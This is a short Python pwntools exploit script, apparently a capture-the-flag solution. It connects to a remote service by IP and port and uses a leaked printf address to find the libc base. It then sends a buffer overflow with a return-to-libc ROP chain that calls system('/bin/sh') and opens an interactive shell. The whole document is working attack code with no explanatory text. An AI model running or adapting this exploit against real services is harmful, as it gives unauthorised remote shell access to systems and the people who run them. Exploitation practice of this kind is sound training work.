from pwn import *
elf=ELF("./libc")
libc=ELF("./libc.so.6")

p=remote("3.131.69.179",19283)
p.recvuntil(b"printf's address : ")
printf=int(p.recvline().decode(),16)
libc_base=printf-libc.symbols['printf']
print(hex(libc_base))

payload=b"A"*24
payload+=p64(0x0040101a) #ret
payload+=p64(0x00401233) #pop rdi;ret;
payload+=p64(libc_base+next(libc.search(b'/bin/sh\x00')))
payload+=p64(libc_base+libc.symbols['system'])

p.sendline(payload)
p.interactive()